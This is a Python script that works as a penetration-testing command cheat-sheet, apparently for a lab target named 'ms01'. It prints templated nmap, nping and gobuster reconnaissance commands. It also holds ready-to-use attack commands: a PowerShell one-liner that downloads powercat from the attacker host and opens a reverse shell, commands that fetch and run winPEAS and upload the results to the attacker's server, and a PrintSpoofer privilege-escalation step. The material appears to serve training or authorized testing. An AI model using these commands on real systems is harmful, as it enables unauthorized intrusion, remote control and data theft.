#!/usr/bin/env python3

# https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-methodology
#
# Discovery Phase:
#  - https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology
#  - https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network#scanning-hosts
#
# Initial Access:
#  - Vulnerable Versions -> exploits!
#  - Network Services Pentesting -> HackTricks port lists!
#  - https://book.hacktricks.xyz/generic-methodologies-and-resources/search-exploits
#  - https://book.hacktricks.xyz/pentesting-web/web-vulnerabilities-methodology
#  - Phishing + Client-Side Attacks (emails)
#
# Privilege Escalation / Lateral Movement:
#  - https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
#  - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
#  - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
#  - https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding

import sys

cmd = sys.argv[1] if len(sys.argv) > 1 else ""

LHOST = "192.168.45.211"
LPORT = 443
LHTTP = 80

RNAME = "ms01"
RHOST = "192.168.185.141"
RPORT = sys.argv[2] if len(sys.argv) > 2 else None

BOLD    = "\033[1m"
BLACK   = "\033[30m"
RED     = "\033[31m"
GREEN   = "\033[32m"
YELLOW  = "\033[33m"
BLUE    = "\033[34m"
MAGENTA = "\033[35m"
CYAN    = "\033[36m"
WHITE   = "\033[37m"
RESET   = "\033[0m"

commands = dict()


#
# --------------------------------------------
# You are given an entity -> discover networks
# You are given a network -> discover hosts
# You are given a host -> discover ports
# --------------------------------------------
#
# - passive information gathering (OSINT)
# - active information gathering
#   - host scanning: dns / whois / ip
#   - port scanning: nmap
#   - general purpose scanners
#

# ===============================================
#  -- Nmap --
# ===============================================
# https://github.com/nmap/nmap/issues/1957
commands["nmap"] = f"""
# General purpose discovery scans
sudo nmap -n -r -A --osscan-guess --version-light -oN {RNAME}/nmap.txt {RHOST}
sudo nmap -n -Pn -r -p- -sS -oN {RNAME}/nmap-tcp-full.txt {RHOST}

# Full scan on specific port
sudo nmap -n -Pn -r -SU -sC -sV --version-all -oN {RNAME}/nmap-{RPORT}.txt {RHOST} -p{RPORT}

# UDP discovery scans
sudo nmap -n -Pn -r -T4 -sUV -F --version-intensity 0 -oN {RNAME}/nmap-udp.txt {RHOST}
sudo nmap -n -Pn -r -T4 -sUV -p- -oN {RNAME}/nmap-udp-full.txt {RHOST}
"""
# if a firewall is at least one hop before the service
# this might distinguish open|filtered udp ports
commands["nmap"] += f"""
# UDP traceroute pings to distinguish open|filtered
nping --udp --traceroute -c 13 -p {RPORT} {RHOST}
nping --udp --traceroute -c 13 -p 53931 {RHOST}
"""


#
# - directory brute-force
# - manual discovery
# - interactive parts
# - source code review
# - technology identification
# - specialized web scanners
# - web page spidering
#

# TODO: file extension searches!
# @("*.xml", "*.txt", "*.conf", "*.config", "*.cfg", "*.ini", ".y*ml", "*.log", "*.bak", "*.xls", "*.xlsx", "*.xlsm")
# ===============================================
#  -- Gobuster --
# ===============================================
commands["gobuster"] = f"""
gobuster dir -u http://{RHOST}:{RPORT}/ -w /usr/share/wordlists/dirb/common.txt -o {RNAME}/gobuster.txt -x txt,pdf
gobuster dir -u http://{RHOST}:{RPORT}/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -o {RNAME}/gobuster-files.txt -x txt,pdf
gobuster dir -u http://{RHOST}:{RPORT}/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o {RNAME}/gobuster-dirs.txt
"""

# ===============================================
#  -- revshell --
# ===============================================
# ./psrevshell.py {LHOST} {LPORT}
commands["revshell"] = f"""
powershell 'IEX(New-Object System.Net.Webclient).DownloadString("http://{LHOST}:{LHTTP}/powercat.ps1"); powercat -c {LHOST} -p {LPORT} -e powershell'
"""

# ===============================================
#  -- WinPEAS --
# ===============================================
# https://github.com/Swafox/reverse-shells/blob/master/revshells.py
commands["winpeas"] = f"""
cp /usr/share/peass/winpeas/winPEASx64.exe {RNAME}/winpeas.exe
python3 -m http.server --cgi {LHTTP}
iwr -Uri http://{LHOST}:{LHTTP}/winpeas.exe -OutFile C:\\Windows\\Temp\\winpeas.exe
C:\\Windows\\Temp\\winpeas.exe --quiet --notcolor > C:\\Windows\\Temp\\winpeas.txt
(New-Object System.Net.WebClient).UploadFile("http://{LHOST}:{LHTTP}/cgi-bin/fileserver.py", "C:\\Windows\\Temp\\winpeas.txt")
"""

# ===============================================
#  -- winprivesc --
# ===============================================
commands["winprivesc"] = f"""
python3 -m http.server {LHTTP}
iwr -Uri http://{LHOST}:{LHTTP}/PrintSpoofer64.exe -OutFile C:\\Windows\\Temp\\PrintSpoofer64.exe
PrintSpoofer64.exe -i -c powershell.exe
"""


if cmd in ("", "list", "help", "-l", "-h", "--list", "--help"):
    print("\n" + "\n".join(sorted(commands.keys())))
elif cmd in commands:
    lines = commands[cmd.lower()][:-1]
    for line in lines.splitlines():
        if line.startswith("#"):
            print(f"{GREEN}{BOLD}{line}{RESET}")
        else:
            print(line)
else:
    print(f"Command '{cmd}' not found")
